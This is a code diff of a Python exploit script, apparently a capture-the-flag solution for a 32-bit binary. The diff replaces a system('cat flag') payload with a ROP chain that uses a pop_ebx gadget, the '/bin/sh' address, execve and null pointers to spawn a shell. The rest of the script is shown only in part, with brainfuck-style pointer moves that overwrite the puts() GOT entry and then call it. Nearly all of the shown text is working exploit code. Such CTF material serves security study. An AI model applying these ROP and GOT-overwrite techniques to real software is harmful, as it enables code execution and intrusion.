@@ -102,14 +102,21 @@ print(f"heap nop rop : {hex(heap_rop_nop)}")
 #payload =my_rop
 fgets_addr_in_main = 0x8048734
 memset_addr_in_main = 0x8048700
+pop_ebx = libc_addr + 0x000183a5
 # 2nd program iteration - 1st half
 payload = p32(memset_addr_in_main)
 payload +=b"aaaabaaacaaa"
-payload += p32(system_addr)
-arg_addr = 0xffffcc6e# TODO - NOTICE THAT IT MIGHT CHANGE IN REAL BINARY (?)
+payload += p32(pop_ebx)
+payload += p32(sh_addr)
+payload += p32(execve_addr)
+#payload += p32(sh_addr)
+null_arr = 0xffffccd8
+payload += p32(sh_addr)
+payload += p32(null_arr)
 # fallback is putting it in heap in fgets input
-payload +=p32(0xffffcba1) 
-payload +=b"faaagcat flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
+payload +=p32(null_arr) 
+payload +=p32(null_arr) 
+#payload +=b" flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
 payload += b"<"  * 27# decrease from putchar() GOT to puts() GOT address
 payload += b",>,>,>," # Setting the puts() GOT address
 payload += b"[" # Calling the puts() 
